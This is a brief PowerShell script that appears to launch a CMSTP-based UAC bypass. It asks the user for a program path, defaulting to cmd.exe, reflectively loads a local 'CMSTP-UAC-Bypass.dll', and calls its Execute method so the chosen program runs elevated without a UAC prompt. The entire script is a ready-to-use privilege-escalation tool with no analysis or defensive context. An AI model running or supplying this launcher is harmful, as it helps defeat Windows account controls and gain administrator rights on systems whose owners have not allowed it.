"If this text is being displayed within a PowerShell window, follow the onscreen prompt."
""
"If you are instead seeing this inside of a text editor, please close the current window, right click this file, and click 'Run with PowerShell' to open."

[void][System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
$floc = [Microsoft.VisualBasic.Interaction]::InputBox("Enter file location and click OK.", "UAC Protected File Bypass", "C:\Windows\System32\cmd.exe")

[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
[CMSTPBypass]::Execute($floc)